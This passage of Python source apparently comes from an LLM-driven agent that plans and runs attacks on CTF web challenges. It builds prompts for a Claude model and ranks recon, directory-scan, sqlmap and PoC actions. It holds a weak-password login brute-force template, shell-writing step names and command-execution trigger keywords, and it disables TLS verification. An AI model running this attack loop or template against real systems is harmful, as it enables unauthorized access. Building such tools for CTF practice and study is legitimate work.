        if any(word in hint_lower for word in ["绕过", "bypass", "绕过"]):
            interpretations.append("可能存在某种绕过点")

        # 基于题型调整
        if problem_type == "auth":
            if not interpretations:
                interpretations.append("认证相关题目，尝试弱口令、SQL注入、源码泄露等")

        elif problem_type == "sqli":
            if not interpretations:
                interpretations.append("SQL注入题目，重点测试参数注入")

        # 如果没有匹配，返回原始 hint
        if not interpretations:
            return f"提示: {hint}"

        return " | ".join(interpretations)

    def _ai_decide(self, context: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """
        AI 决策方法。

        基于构建的上下文，让 AI 决定下一步应该做什么。
        配置优先级：环境变量 > config.json
        """
        import os
        import requests as _requests

        # 从 config.json 加载配置
        cfg = _LLM_CONFIG

        # api_key: config.json > 环境变量
        api_key = os.environ.get("ANTHROPIC_API_KEY", "").strip() or cfg.get("api_key", "").strip()
        # api_base: config.json > 环境变量
        api_base = os.environ.get("ANTHROPIC_BASE_URL", "").strip() or cfg.get("api_base", "").strip()
        # model: config.json > 环境变量
        model_name = os.environ.get("ANTHROPIC_MODEL", "").strip() or cfg.get("model", "claude-sonnet-4-6").strip()
        # temperature: config.json > 默认值
        temperature = cfg.get("temperature", 0.3)
        # max_tokens: config.json > 默认值
        max_tokens = cfg.get("max_tokens", 500)

        # 如果没有配置任何 LLM，回退到旧逻辑
        if not api_key and not api_base:
            return None

        # 构建 prompt
        prompt = self._build_decision_prompt(context)

        try:
            if api_base:
                response = _requests.post(
                    api_base.rstrip("/") + "/chat",
                    json={
                        "model": model_name,
                        "messages": [{"role": "user", "content": prompt}],
                        "max_tokens": max_tokens,
                        "temperature": temperature,
                    },
                    headers={"Authorization": f"Bearer {api_key}"} if api_key else {},
                    timeout=30,
                    verify=False,
                )
                response.raise_for_status()
                content = response.json().get("content", "")
            else:
                from anthropic import Anthropic
                if not api_key:
                    return None
                client = Anthropic(api_key=api_key)
                message = client.messages.create(
                    model=model_name,
                    max_tokens=max_tokens,
                    temperature=temperature,
                    system="你是一个 CTF Web 解题助手的规划器。你需要根据当前上下文，决定下一步应该做什么。",
                    messages=[{"role": "user", "content": prompt}],
                )
                content = message.content[0].text if message.content else ""

            # 解析 AI 返回的决策
            return self._parse_ai_decision(content)

        except Exception as e:
            self.log(f"[AI Decision] LLM 调用失败: {e}", "WARN")
            return None

    def _build_decision_prompt(self, context: Dict[str, Any]) -> str:
        """构建 AI 决策 prompt。"""
        problem_type = context.get("problem_type", "unknown")
        target_url = context.get("target_url", "")
        hint = context.get("hint", "无")
        findings = context.get("findings_summary", "暂无")
        history = context.get("action_history_summary", "暂无")
        failures = context.get("failure_summary", "暂无")
        resources = context.get("resource_summary", "暂无")
        tools = context.get("available_tools", {})
        state = context.get("current_state", {})
        constraints = context.get("constraints", {})

        # 工具语义库
        tool_desc = []
        for name, info in tools.items():
            tool_desc.append(f"- {name}: {info.get('适用', '')}")

        prompt = f"""## 任务
你是一个 CTF Web 解题助手。你的目标是通过分析当前情况，决定下一步应该做什么。

## 目标信息
- URL: {target_url}
- 题型: {problem_type}
- 提示: {hint}
- 提示解读: {context.get('hint_interpretation', '无特殊提示')}

## 当前状态
- 已执行步数: {state.get('steps_count', 0)}
- 连续失败次数: {state.get('consecutive_failures', 0)}
- 当前轮次: {state.get('round', 1)}

## 上下文摘要

### 已发现的线索
{findings}

### 历史动作
{history}

### 失败分析
{failures}

### 可用资源
{resources}

## 可用工具
{chr(10).join(tool_desc)}

## 安全约束
- 最多执行 {constraints.get('max_steps', 20)} 步
- 单个工具最多失败 {constraints.get('max_failures', 3)} 次
- 至少 {constraints.get('min_steps_before_help', 5)} 步后才能求助

## 决策要求

1. **分析当前情况**：基于上述上下文，理解目标的当前状态
2. **选择下一步动作**：
   - 工具名称（如 recon, dirsearch, sqlmap, python_poc）
   - 目标（如具体 URL、参数）
   - 具体参数（如扫描深度、payload 类型）
3. **给出理由**：解释为什么选择这个动作（30字以内）
4. **重要约束**：
   - 不要重复已失败的尝试
   - 利用已发现的线索
   - 如果一个方向连续失败，应该换方向而不是换参数

## 输出格式
请用 JSON 格式返回你的决策：
{{
  "tool": "工具名称",
  "target": "具体目标",
  "params": {{"参数": "值"}},
  "reason": "决策理由"
}}

只返回 JSON，不要其他内容。
"""
        return prompt

    def _parse_ai_decision(self, content: str) -> Optional[Dict[str, Any]]:
        """解析 AI 返回的决策。"""
        import re
        import json

        # 尝试提取 JSON
        json_match = re.search(r'\{[^{}]*\}', content, re.DOTALL)
        if json_match:
            try:
                decision = json.loads(json_match.group())
                # 验证必要字段
                if decision.get("tool") and decision.get("target"):
                    return decision
            except json.JSONDecodeError:
                pass

        # 如果解析失败，返回 None
        return None

    def _try_ai_decision(self) -> Optional[Dict[str, Any]]:
        """尝试 AI 决策。"""
        import os

        # 检查是否配置了 LLM
        cfg = _LLM_CONFIG
        api_key = os.environ.get("ANTHROPIC_API_KEY", "").strip() or cfg.get("api_key", "").strip()
        api_base = os.environ.get("ANTHROPIC_BASE_URL", "").strip() or cfg.get("api_base", "").strip()

        if not api_key and not api_base:
            return None

        # === 新增：自我反思检查 ===
        # 如果触发反思条件，先进行反思
        if self._should_self_reflect():
            reflection_result = self._do_self_reflect()
            if reflection_result:
                self.log(f"[Self-Reflection] {reflection_result.get('summary', '')}", "AI")
                # 将反思结果融入上下文
                context = self._build_decision_context()
                context["self_reflection"] = reflection_result
                return self._ai_decide(context)
        # === 反思检查结束 ===

        # 构建上下文
        context = self._build_decision_context()

        # 调用 AI 决策
        return self._ai_decide(context)

    def _should_self_reflect(self) -> bool:
        """检查是否应该触发自我反思。"""
        steps = self.memory.steps
        if len(steps) < 5:
            return False

        # 触发条件：
        # 1. 连续 3 次同类工具失败
        consecutive_failures = self._get_consecutive_failures()
        if consecutive_failures >= 3:
            return True

        # 2. 最近 5 步没有新发现
        recent_steps = steps[-5:]
        has_new_finding = any(step.key_findings for step in recent_steps)
        if not has_new_finding and len(steps) >= 5:
            return True

        # 3. 工具选择陷入循环（重复使用同一工具）
        recent_tools = [step.tool for step in steps[-5:]]
        if len(set(recent_tools)) == 1 and len(recent_tools) == 5:
            return True

        return False

    def _do_self_reflect(self) -> Optional[Dict[str, Any]]:
        """执行自我反思。"""
        context = self._build_decision_context()

        prompt = f"""## 任务
你是一个 CTF Web 解题助手。你需要反思当前情况，总结经验教训，并提出新的攻击方向。

## 当前情况
{context.get('action_history_summary', '')}

## 失败分析
{context.get('failure_summary', '')}

## 已发现的线索
{context.get('findings_summary', '')}

## 已加载的资源
{context.get('resource_summary', '')}

## 历史经验（长期记忆）
{self._get_long_memory_context()}

## 反思问题

1. 到目前为止，我们尝试了哪些方法？
2. 为什么这些方法都失败了？
3. 是否有遗漏的攻击面？
4. 应该尝试什么新方向？
5. 历史经验中有无可供参考的攻击方法？

## 输出格式
请用 JSON 格式返回你的反思：
{{
  "analysis": "对当前情况的分析",
  "lessons": ["经验1", "经验2"],
  "new_directions": ["新方向1", "新方向2"],
  "summary": "一句话总结"
}}

只返回 JSON，不要其他内容。
"""
        import requests as _requests
        import os
        import json
        import re

        cfg = _LLM_CONFIG

        api_key = os.environ.get("ANTHROPIC_API_KEY", "").strip() or cfg.get("api_key", "").strip()
        api_base = os.environ.get("ANTHROPIC_BASE_URL", "").strip() or cfg.get("api_base", "").strip()
        model_name = os.environ.get("ANTHROPIC_MODEL", "").strip() or cfg.get("model", "claude-sonnet-4-6").strip()
        temperature = cfg.get("temperature", 0.3)
        max_tokens = cfg.get("max_tokens", 500)

        try:
            if api_base:
                response = _requests.post(
                    api_base.rstrip("/") + "/chat",
                    json={
                        "model": model_name,
                        "messages": [{"role": "user", "content": prompt}],
                        "max_tokens": max_tokens * 2,  # 反思需要更多 tokens
                        "temperature": temperature,
                    },
                    headers={"Authorization": f"Bearer {api_key}"} if api_key else {},
                    timeout=30,
                    verify=False,
                )
                response.raise_for_status()
                content = response.json().get("content", "")
            else:
                from anthropic import Anthropic
                client = Anthropic(api_key=api_key)
                message = client.messages.create(
                    model=model_name,
                    max_tokens=max_tokens * 2,
                    temperature=temperature,
                    system="你是一个 CTF Web 解题助手的反思模块。",
                    messages=[{"role": "user", "content": prompt}],
                )
                content = message.content[0].text if message.content else ""

            # 解析 JSON
            json_match = re.search(r'\{[^{}]*\}', content, re.DOTALL)
            if json_match:
                result = json.loads(json_match.group())
                return result

        except Exception as e:
            self.log(f"[Self-Reflection] 调用失败: {e}", "WARN")

        return None

    def _build_action_from_ai_decision(self, decision: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """将 AI 决策转换为 action。"""
        tool = decision.get("tool", "").lower()
        target = decision.get("target", self.target_url or "")
        params = decision.get("params", {})
        reason = decision.get("reason", "")

        # 工具名称映射
        tool_mapping = {
            "recon": "recon",
            "dirsearch": "dir_scan",
            "dir_scan": "dir_scan",
            "sqlmap": "sqlmap_scan",
            "sqlmap_scan": "sqlmap_scan",
            "python_poc": "poc",
            "poc": "poc",
            "source_analysis": "source_analysis",
            "ua_test": "ua_test",
            "follow_redirect": "follow_redirect",
        }

        action_type = tool_mapping.get(tool, tool)
        if not action_type:
            return None

        # 构建 action
        return self._build_action(
            action_type,
            target=target,
            description=reason or f"AI 决策: {tool}",
            intent=reason or f"执行 AI 决策",
            expected_tool=tool,
            params=params,
            metadata={
                "ai_decision": True,
                "original_tool": tool,
                "reason": reason,
            },
        )

    def _create_attack_plan(self) -> None:
        """根据当前类型与源码分析结果创建攻击计划。"""
        if not self.target_url:
            return
        self.attack_plan = self.planner.create_plan(
            vuln_type=self.target_type,
            target_url=self.target_url,
            source_analysis=self.source_analysis_result,
        )

    def _generate_action_id(
        self,
        action_type: str,
        target: str = "",
        params: Optional[Dict[str, Any]] = None,
    ) -> str:
        payload = json.dumps(
            {
                "type": action_type,
                "target": target,
                "params": params or {},
            },
            ensure_ascii=False,
            sort_keys=True,
        )
        return hashlib.md5(payload.encode("utf-8")).hexdigest()[:12]

    def _build_action(
        self,
        action_type: str,
        target: str = "",
        description: str = "",
        intent: str = "",
        expected_tool: str = "",
        params: Optional[Dict[str, Any]] = None,
        metadata: Optional[Dict[str, Any]] = None,
    ) -> Dict[str, Any]:
        normalized_params = dict(params or {})
        action = {
            "id": self._generate_action_id(action_type, target, normalized_params),
            "type": action_type,
            "target": target,
            "description": description,
            "intent": intent or description,
            "expected_tool": expected_tool or action_type,
            "params": normalized_params,
        }
        if metadata:
            action.update(metadata)
        action["graph_op"] = self.graph_manager.build_action_graph_op(action)
        return action

    def _expected_tool_for_attack_step(self, step_name: str, has_code: bool = False) -> str:
        if step_name in {"detect_sqli", "extract_data"}:
            return "sqlmap"
        if step_name == "exploit":
            return "dirsearch"
        if step_name in {
            "extract_flag",
            "configure_environment",
            "write_shell",
            "trigger_include",
            "test_mobile_ua",
            "follow_redirect",
            "test_lfi",
            "recon",
        }:
            return "python_poc"
        if has_code:
            return "python_poc"
        return "attack_step"

    def _canonical_tool_name(self, action: Dict[str, Any]) -> str:
        action_type = action.get("type", "unknown")
        params = action.get("params", {})
        step_name = action.get("step_name") or params.get("from_attack_step", "")
        has_code = bool(action.get("code") or params.get("code"))

        if action_type == "attack_step":
            return self._expected_tool_for_attack_step(step_name, has_code)

        tool_name = action.get("expected_tool") or action_type
        return {
            "recon": "python_poc",
            "ua_test": "python_poc",
            "follow_redirect": "python_poc",
            "poc": "python_poc",
            "source_analysis": "source_analysis",
            "dir_scan": "dirsearch",
            "dirsearch": "dirsearch",
            "sqlmap_scan": "sqlmap",
            "sqlmap_deep_scan": "sqlmap",
            "sqlmap": "sqlmap",
        }.get(tool_name, tool_name)

    def _build_memory_action_meta(self, action: Dict[str, Any]) -> Dict[str, str]:
        if not action:
            return {}
        action_type = str(action.get("type", ""))
        expected_tool = str(action.get("expected_tool") or action_type)
        return {
            "action_id": str(action.get("id", "")),
            "action_type": action_type,
            "expected_tool": expected_tool,
            "canonical_tool": self._canonical_tool_name(action),
        }

    def _count_recent_failures_by_tool(self, tool: str, window: int = 5) -> int:
        recent_steps = self.memory.steps[-window:] if window > 0 else self.memory.steps
        return sum(
            1
            for step in recent_steps
            if not step.success and (step.canonical_tool or step.tool) == tool
        )

    def _mark_action_completed(self, action: Dict[str, Any], result: str) -> None:
        if action.get("type") == "attack_step" and self.attack_plan:
            step_name = action.get("step_name")
            if step_name:
                self.attack_plan.mark_step_completed(step_name, result)

    def _build_executor_error(self, action: Dict[str, Any], message: str) -> str:
        return f"[{action.get('type', 'unknown')}] {message}"

    def _resolve_action_success(
        self,
        action: Dict[str, Any],
        default: bool = True,
        step_num: Optional[int] = None,
    ) -> bool:
        """优先使用 memory 中当前 action 的实际 success。"""
        step = self._latest_memory_step_for_action(action, step_num=step_num)
        if step is not None:
            return step.success
        return default

    def _generate_help_request(self, step_num: int, summary: str) -> str:
        last_action = self.last_action or {}
        last_action_desc = last_action.get("description") or last_action.get("type") or "unknown"
        return (
            f"第 {step_num} 步后需要人工介入。\n"
            f"目标: {self.target_url or 'unknown'}\n"
            f"题目类型: {self.target_type or 'unknown'}\n"
            f"最近动作: {last_action_desc}\n\n"
            f"当前摘要:\n{summary}"
        )

    def _action_candidate_summary(self, action: Dict[str, Any]) -> Dict[str, Any]:
        action = dict(action or {})
        summary: Dict[str, Any] = {
            "action_id": str(action.get("id") or ""),
            "action_type": str(action.get("type") or ""),
            "target": str(action.get("target") or ""),
            "description": str(action.get("description") or ""),
            "intent": str(action.get("intent") or ""),
            "expected_tool": str(self._canonical_tool_name(action) or action.get("expected_tool") or ""),
        }
        params = dict(action.get("params") or {})
        if params:
            summary["params"] = params
        for key in (
            "source_finding_kind",
            "source_finding_value",
            "source_action_id",
            "source_action_type",
            "source_node_id",
            "alternative_to",
            "derived_from",
            "verification_family",
            "priority",
            "tactic_family",
            "resource_source",
        ):
            value = str(action.get(key) or "").strip()
            if value:
                summary[key] = value
        return {
            key: value
            for key, value in summary.items()
            if value not in ("", None, [], {})
        }

    def _candidate_canonical_tool(self, candidate: Dict[str, Any]) -> str:
        candidate = dict(candidate or {})
        action_type = str(candidate.get("action_type") or candidate.get("type") or "").strip()
        expected_tool = str(candidate.get("expected_tool") or action_type).strip()
        return self._canonical_tool_name(
            {
                "type": action_type or expected_tool,
                "expected_tool": expected_tool or action_type,
                "params": dict(candidate.get("params") or {}),
            }
        )

    def _graph_candidate_sort_key(
        self,
        candidate: Dict[str, Any],
        *,
        signals: Optional[Dict[str, Any]] = None,
        recent_failure_stats: Optional[Dict[str, Any]] = None,
        replan: Optional[Dict[str, Any]] = None,
    ) -> Any:
        candidate = dict(candidate or {})
        signals = dict(signals or {})
        recent_failure_stats = dict(recent_failure_stats or {})
        replan_payload = dict(replan or {})

        action_id = str(candidate.get("action_id") or candidate.get("id") or "").strip()
        action_type = str(candidate.get("action_type") or candidate.get("type") or "").strip()
        target = str(candidate.get("target") or "").strip()
        canonical_tool = self._candidate_canonical_tool(candidate)

        recent_tool_counts = dict(recent_failure_stats.get("canonical_tool_counts") or {})
        recent_action_type_counts = dict(recent_failure_stats.get("action_type_counts") or {})
        graph_tool_counts = dict(signals.get("failed_tool_counts") or {})
        source_finding_kind = str(candidate.get("source_finding_kind") or "").strip()
        source_finding_value = str(candidate.get("source_finding_value") or "").strip()
        verification_family = str(candidate.get("verification_family") or source_finding_kind or "").strip()
        lineage_key = "::".join([part for part in [source_finding_kind, source_finding_value, verification_family] if part])
        blocked_tools = {
            str(value or "").strip()
            for value in replan_payload.get("blocked_tools") or []
            if str(value or "").strip()
        }
        blocked_action_ids = {
            str(value or "").strip()
            for value in [
                *(replan_payload.get("blocked_action_ids") or []),
                replan_payload.get("source_action_id") or "",
            ]
            if str(value or "").strip()
        }
        seen_targets = {
            str(step.target or "").strip()
            for step in self.memory.steps
            if str(step.target or "").strip()
        }
        current_target = str(self.target_url or getattr(self.agent_context, "url", "") or "").strip()

        recent_tool_failures = int(recent_tool_counts.get(canonical_tool, 0))
        graph_tool_failures = int(graph_tool_counts.get(canonical_tool, 0))
        recent_action_type_failures = int(recent_action_type_counts.get(action_type, 0))
        finding_failure_counts = dict(signals.get("finding_failure_counts") or {})
        finding_attempt_counts = dict(signals.get("finding_attempt_counts") or {})
        blocked_findings = {
            str(item.get("lineage_key") or "").strip()
            for item in (signals.get("blocked_findings") or [])
            if str(item.get("lineage_key") or "").strip()
        }
        replan_lineage = "::".join(
            [
                part
                for part in [
                    str(replan_payload.get("source_finding_kind") or "").strip(),
                    str(replan_payload.get("source_finding_value") or "").strip(),
                    str(replan_payload.get("verification_family") or replan_payload.get("source_finding_kind") or "").strip(),
                ]
                if part
            ]
        )
        avoid_lineages = {
            str(value or "").strip()
            for value in [*(replan_payload.get("avoid_lineages") or []), *blocked_findings, replan_lineage]
            if str(value or "").strip()
        }
        lineage_failures = int(finding_failure_counts.get(lineage_key, 0)) if lineage_key else 0
        lineage_attempts = int(finding_attempt_counts.get(lineage_key, 0)) if lineage_key else 0
        linked_to_source = any(
            str(candidate.get(key) or "").strip() in blocked_action_ids
            for key in ("alternative_to", "derived_from", "source_action_id")
        )
        finding_backed = bool(
            str(candidate.get("source_finding_kind") or "").strip()
            and str(candidate.get("source_finding_value") or "").strip()
        )
        new_target = bool(target and target != current_target and target not in seen_targets)
        diversification_needed = str(replan_payload.get("reason_code") or replan_payload.get("reason") or "").strip() in {
            "limited_diversity",
            "consecutive_failures",
        }

        return (
            0 if canonical_tool and canonical_tool not in blocked_tools else 1,
            0 if lineage_key and lineage_key not in avoid_lineages else 1,
            0 if finding_backed else 1,
            0 if diversification_needed and lineage_failures == 0 else 1,
            lineage_failures,
            lineage_attempts,
            0 if diversification_needed and recent_tool_failures == 0 else 1,
            recent_tool_failures,
            graph_tool_failures,
            recent_action_type_failures,
            0 if new_target else 1,
            0 if linked_to_source else 1,
            canonical_tool,
            action_type,
            target,
            action_id,
        )

    def _rank_graph_informed_candidates(
        self,
        candidates: List[Dict[str, Any]],
        *,
        signals: Optional[Dict[str, Any]] = None,
        recent_failure_stats: Optional[Dict[str, Any]] = None,
        replan: Optional[Dict[str, Any]] = None,
    ) -> List[Dict[str, Any]]:
        ranked = [dict(candidate) for candidate in candidates if candidate]
        return sorted(
            ranked,
            key=lambda candidate: self._graph_candidate_sort_key(
                candidate,
                signals=signals,
                recent_failure_stats=recent_failure_stats,
                replan=replan,
            ),
        )

    def _build_action_from_candidate(self, candidate: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        candidate = dict(candidate or {})
        action_type = str(candidate.get("action_type") or candidate.get("type") or "").strip()
        if not action_type:
            return None

        metadata: Dict[str, Any] = {}
        for key in (
            "source_finding_kind",
            "source_finding_value",
            "source_action_id",
            "source_action_type",
            "source_node_id",
            "alternative_to",
            "derived_from",
            "verification_family",
            "priority",
            "tactic_family",
            "resource_source",
        ):
            value = str(candidate.get(key) or "").strip()
            if value:
                metadata[key] = value

        return self._build_action(
            action_type,
            target=str(candidate.get("target") or self.target_url or ""),
            description=str(candidate.get("description") or ""),
            intent=str(candidate.get("intent") or candidate.get("description") or ""),
            expected_tool=str(candidate.get("expected_tool") or action_type),
            params=dict(candidate.get("params") or {}),
            metadata=metadata or None,
        )

    def _apply_replan_to_action(self, action: Dict[str, Any], replan: Dict[str, Any]) -> Dict[str, Any]:
        action = dict(action or {})
        replan_payload = dict(replan or {})
        if not action or not replan_payload:
            return action

        selected_alternative = dict(replan_payload.get("selected_alternative") or {})
        if not selected_alternative:
            selected_alternative = self._action_candidate_summary(action)
        if not replan_payload.get("alternative_candidates"):
            replan_payload["alternative_candidates"] = [dict(selected_alternative)]
        replan_payload["selected_alternative"] = dict(selected_alternative)

        action["graph_driven"] = True
        action["alternative"] = True
        action["replan"] = replan_payload

        for key in ("blocked_action_ids", "blocked_tools", "avoid_action_ids", "avoid_tools"):
            values = list(replan_payload.get(key) or [])
            if values:
                action[key] = values

        for key in (
            "source_finding_kind",
            "source_finding_value",
            "source_action_id",
            "source_action_type",
            "source_node_id",
        ):
            value = str(replan_payload.get(key) or "").strip()
            if value:
                action[key] = value

        source_action_id = str(replan_payload.get("source_action_id") or "").strip()
        if source_action_id:
            action.setdefault("alternative_to", source_action_id)
            action.setdefault("derived_from", source_action_id)

        return action

    def _build_verification_action_from_finding(self, finding: Dict[str, Any], target: str) -> Optional[Dict[str, Any]]:
        finding = dict(finding or {})
        kind = str(finding.get("kind") or "").strip()
        value = str(finding.get("value") or "").strip()
        source_action_id = str(finding.get("source_action_id") or "").strip()
        source_node_id = str(finding.get("source_node_id") or "").strip()
        metadata = {
            "source_finding_kind": kind,
            "source_finding_value": value,
            "source_action_id": source_action_id,
            "source_node_id": source_node_id,
            "verification_family": kind or "finding",
            "priority": "high",
        }
        normalized_value = value.lower()
        if kind == "repo_exposure":
            if any(token in normalized_value for token in [".git/head", "/.git", ".svn/entries", ".hg/"]):
                return self._build_action(
                    "recon",
                    target=self._target_with_endpoint(value) if value.startswith("/") or value.startswith("http") else target,
                    description="围绕仓库泄露入口做定向验证",
                    intent="优先验证仓库泄露并转向源码/敏感文件利用链",
                    expected_tool="recon",
                    params={"focus": "repo-exposure", "finding_value": value},
                    metadata={**metadata, "tactic_family": "repo_exposure"},
                )
        if kind == "backup_file":
            return self._build_action(
                "recon",
                target=self._target_with_endpoint(value) if value.startswith("/") or value.startswith("http") else target,
                description="围绕备份文件做定向验证",
                intent="优先下载/确认备份文件内容，转向源码泄露利用链",
                expected_tool="recon",
                params={"focus": "backup-file", "finding_value": value},
                metadata={**metadata, "tactic_family": "backup_file"},
            )
        if kind in {"sensitive_file", "debug_page", "info_leak", "shell_artifact"}:
            return self._build_action(
                "recon",
                target=self._target_with_endpoint(value) if value.startswith("/") or value.startswith("http") else target,
                description="围绕高价值 finding 做定向验证",
                intent="优先验证已发现的高价值敏感面",
                expected_tool="recon",
                params={"focus": kind, "finding_value": value},
                metadata=metadata,
            )
        if kind in {"source_leak"}:
            return self._build_action(
                "source_analysis",
                target=target,
                description="围绕源码泄露线索做分析",
                intent="将源码/调试页线索转成可利用分析",
                expected_tool="source_analysis",
                params={"focus": kind, "finding_value": value, "code": self.source_code or value},
                metadata={**metadata, "tactic_family": "source_leak"},
            )
        if kind in {"auth_hint", "form_field", "form_method"}:
            return self._build_action(
                "recon",
                target=target,
                description="围绕登录表单结构化线索做确认",
                intent="将表单字段/方法/认证提示转成后续认证攻击分支",
                expected_tool="recon",
                params={"focus": kind, "finding_value": value},
                metadata={**metadata, "tactic_family": "endpoint-enum"},
            )
        if kind in {"parameter", "vulnerability"}:
            return self._build_action(
                "sqlmap_scan" if kind == "parameter" else "poc",
                target=target if kind != "parameter" else (target if "=" in target else f"{target}{'&' if '?' in target else '?'}{value}=1"),
                description="围绕结构化 finding 做验证",
                intent="优先验证 finding 对应的利用面",
                expected_tool="sqlmap" if kind == "parameter" else "python_poc",
                params={"batch": True} if kind == "parameter" else {"finding_value": value},
                metadata=metadata,
            )
        return None

    def _build_guidance_actions(
        self,
        guidance: str,
        *,
        target: str,
        source_action_id: str = "",
        source_action_type: str = "",
    ) -> List[Dict[str, Any]]:
        guidance_text = str(guidance or "").strip()
        if not guidance_text:
            return []
        guidance_lower = guidance_text.lower()
        actions: List[Dict[str, Any]] = []

        def add(action_type: str, description: str, intent: str, expected_tool: str, params: Optional[Dict[str, Any]] = None) -> None:
            action = self._build_action(
                action_type,
                target=target,
                description=description,
                intent=intent,
                expected_tool=expected_tool,
                params=dict(params or {}),
                metadata={
                    "source_finding_kind": "guidance",
                    "source_finding_value": guidance_text,
                    "source_action_id": source_action_id,
                    "source_action_type": source_action_type,
                    "verification_family": "guidance",
                    "priority": "medium",
                },
            )
            actions.append(action)

        if "cookie" in guidance_lower:
            add("recon", "根据人工提示重新侦察", "围绕 cookies/session 线索重新采样响应", "recon", {"focus": "cookies"})
        if any(token in guidance_lower for token in ["ua", "user-agent", "mobile"]):
            add("ua_test", "根据提示测试 UA 分支", "优先验证人工提示中的 User-Agent 线索", "ua_test", {"ua": "Mobile"})
        if any(token in guidance_lower for token in ["cmd", "eval", "rce", "exec", "shell", "命令执行", "代码执行"]):
            add("python_poc", "根据高价值线索尝试命令执行", "基于 cmd/eval/rce 线索构造 PoC", "python_poc")
        if any(token in guidance_lower for token in ["source", "源码", "泄露", "leak", "highlight"]):
            add("source_analysis", "根据源码泄露线索分析", "基于源码泄露线索定位可利用点", "source_analysis")
        if any(token in guidance_lower for token in ["parameter", "参数", "param", "arg"]):
            add("recon", "根据参数线索深入侦察", "围绕已发现参数收集更多利用上下文", "recon", {"focus": "parameters"})

        return actions

    def _build_resource_backed_actions(self, target: str, signals: Dict[str, Any], source_action_id: str = "", source_action_type: str = "", allow_auth_sqli: bool = False) -> List[Dict[str, Any]]:
        actions: List[Dict[str, Any]] = []
        loaded_resources = dict(getattr(self.agent_context, "loaded_resources", {}) or self.init_result.get("loaded_resources") or {})
        skill_content = str(getattr(self.agent_context, "skill_content", "") or self.init_result.get("skill_content") or "")
        rag_summary = str(getattr(self.agent_context, "rag_summary", "") or "")
        rag_suggested = str(getattr(self.agent_context, "rag_suggested_approach", "") or "")
        known_endpoints = list(signals.get("known_endpoints") or [])
        known_parameters = list(signals.get("known_parameters") or [])

        def build(action_type: str, description: str, intent: str, expected_tool: str, *, params: Optional[Dict[str, Any]] = None, tactic_family: str = "", source: str = "") -> Dict[str, Any]:
            metadata = {
                "source_finding_kind": source or "resource",
                "source_finding_value": tactic_family or description,
                "source_action_id": source_action_id,
                "source_action_type": source_action_type,
                "verification_family": tactic_family or source or action_type,
                "priority": "medium",
                "tactic_family": tactic_family or action_type,
                "resource_source": source or "resource",
            }
            return self._build_action(
                action_type,
                target=target,
                description=description,
                intent=intent,
                expected_tool=expected_tool,
                params=dict(params or {}),
                metadata=metadata,
            )

        lower_skill = skill_content.lower()
        if self.target_type == "auth":
            login_endpoints = [ep for ep in known_endpoints if any(token in ep.lower() for token in ["login", "check", "signin", "auth"])]
            login_params = [p for p in known_parameters if p.lower() in ["u", "p", "username", "password", "user", "pass", "email", "token", "csrf"]]
            endpoint = login_endpoints[0] if login_endpoints else "check.php"
            param_u = login_params[0] if login_params else "u"
            param_p = login_params[1] if len(login_params) > 1 else "p"
            actions.append(build(
                "poc",
                "基于已加载资源尝试弱口令登录",
                "优先覆盖 auth family: weak-creds",
                "python_poc",
                params={
                    "code": f'''import requests\nimport urllib3\nurllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\nurl = "{target.rstrip('/')}/{endpoint}"\nfor pwd in ["admin","admin123","123456","password","root","toor","ctfshow"]:\n    r = requests.post(url, data={{"{param_u}": "admin", "{param_p}": pwd}}, verify=False, timeout=10)\n    print(f"TRY {{pwd}} => {{r.status_code}} {{r.text[:120]}}")\n''',
                    "endpoint": endpoint,
                    "login_params": [param_u, param_p],
                },
                tactic_family="weak-creds",
                source="long_memory" if loaded_resources else "skill",
            ))
            if allow_auth_sqli and (login_endpoints or len(login_params) >= 2):
                actions.append(build(
                    "sqlmap_scan",
                    "基于认证入口尝试参数注入验证",
                    "优先覆盖 auth family: auth-sqli",
                    "sqlmap",
                    params={"batch": True},
                    tactic_family="auth-sqli",
                    source="skill" if skill_content else "resource",
                ))
            actions.append(build(
                "recon",
                "围绕认证入口继续枚举与分支确认",
                "优先覆盖 auth family: endpoint-enum",
                "recon",
                params={"focus": "auth-endpoints", "known_endpoints": login_endpoints},
                tactic_family="endpoint-enum",
                source="skill" if skill_content else "resource",
            ))

        if rag_summary or rag_suggested:
            rag_text = (rag_summary + " " + rag_suggested).lower()
            if self.target_type == "auth" and any(token in rag_text for token in ["payload", "family", "parameter", "参数", "verify known parameters"]):
                actions.append(build(
                    "recon",
                    "根据 RAG 建议继续确认认证入口",
                    "auth 场景先完成 endpoint-enum，再决定是否切参数验证",
                    "recon",
                    params={"focus": "auth-rag-followup"},
                    tactic_family="endpoint-enum",
                    source="rag",
                ))
            if self.target_type != "auth" and any(token in rag_text for token in ["payload", "family", "parameter", "参数", "verify known parameters"]):
                latest_parameter = (known_parameters[-1] if known_parameters else "id")
                param_target = target if "=" in target else f"{target}{'&' if '?' in target else '?'}{latest_parameter}=1"
                actions.append(build(
                    "sqlmap_scan",
                    "根据 RAG 建议切换 payload family 验证参数",
                    "消费 RAG suggested approach 生成下一轮候选",
                    "sqlmap",
                    params={"batch": True},
                    tactic_family="rag-parameter-verify",
                    source="rag",
                ))
            if any(token in rag_text for token in ["source", "源码", "leak", "debug"]):
                actions.append(build(
                    "source_analysis",
                    "根据 RAG 建议围绕源码/泄露线索分析",
                    "消费 RAG suggested approach 生成源码分析动作",
                    "source_analysis",
                    params={"focus": "rag-source-leak"},
                    tactic_family="rag-source-analysis",
                    source="rag",
                ))

        return actions

    def _collect_graph_informed_actions(self, replan: Optional[Dict[str, Any]] = None) -> List[Dict[str, Any]]:
        self._refresh_graph_state()
        steps = self.memory.steps
        target = self.target_url
        signals = self.graph_manager.planner_signals()
        recent_failure_stats = self._recent_action_failure_counts(window=5)
        latest_guidance = str(signals.get("latest_guidance") or "").strip()
        priority_findings = list(signals.get("priority_findings") or [])
        verification_hints = list(signals.get("verification_hints") or [])
        known_endpoints = list(signals.get("known_endpoints") or [])
        known_parameters = list(signals.get("known_parameters") or [])
        failed_tools = set(signals.get("failed_tools") or [])
        failed_tools.update(
            tool
            for tool, count in recent_failure_stats.get("canonical_tool_counts", {}).items()
            if count > 0
        )

        auth_state = self._auth_progress_state() if self.target_type == "auth" else {}
        has_auth_weak_creds_attempt = bool(auth_state.get("weak_creds_attempted", False))
        has_auth_endpoint_enum_attempt = bool(auth_state.get("endpoint_enum_attempted", False))
        has_auth_endpoint_enum_success = bool(auth_state.get("endpoint_enum_confirmed", False))
